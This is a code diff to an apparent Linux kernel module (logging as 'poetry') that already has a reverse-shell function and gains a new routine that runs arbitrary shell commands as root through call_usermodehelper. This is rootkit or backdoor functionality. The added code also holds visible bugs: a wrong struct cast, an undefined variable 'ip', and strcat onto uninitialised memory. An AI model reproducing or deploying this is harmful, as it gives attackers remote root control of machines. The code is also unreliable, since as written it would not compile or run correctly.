@@ -1,4 +1,3 @@
-#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
 #define HOME "HOME=/root"
 #define TERM "TERM=xterm-256color"
 #define SHELL "/bin/bash"
@@ -9,6 +8,11 @@ struct shell_params {
 	struct work_struct work;
 	char* target_ip;
 	char* target_port;
+};
+
+struct command_params {
+    struct work_struct work;
+    char* command;
 };
 
 void execute_reverse_shell(struct work_struct *work){
@@ -52,5 +56,41 @@ int start_reverse_shell(char* ip, char* port){
         printk(KERN_INFO "poetry: Error scheduling work of starting shell\n");
     }
     return err;
+}
 
+void execute_command(struct work_struct *work)
+{
+    int err;
+    struct shell_params *params = (struct shell_params*)work;
+    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
+    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
+    char *argv[] = {SHELL, "-c", exec, NULL};
+    strcat(exec, params->command);
+    printk(KERN_INFO "poetry: executing command %s\n", exec);
+
+    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if(err<0){
+        printk(KERN_INFO "poetry: Error executing usermodehelper.\n");
+    }
+    kfree(exec);
+    kfree(params->command);
+    kfree(params);
+}
+
+int start_command(char* command)
+{
+    int err;
+    struct command_params *params = kmalloc(sizeof(struct command_params), GFP_KERNEL);
+    if(!params){
+        printk(KERN_INFO "poetry: Error allocating memory\n");
+        return 1;
+    }
+    params->command = kstrdup(ip, GFP_KERNEL);
+    INIT_WORK(&params->work, &execute_command);
+
+    err = schedule_work(&params->work);
+    if(err<0){
+        printk(KERN_INFO "poetry: Error scheduling work of executing command\n");
+    }
+    return err;
 }
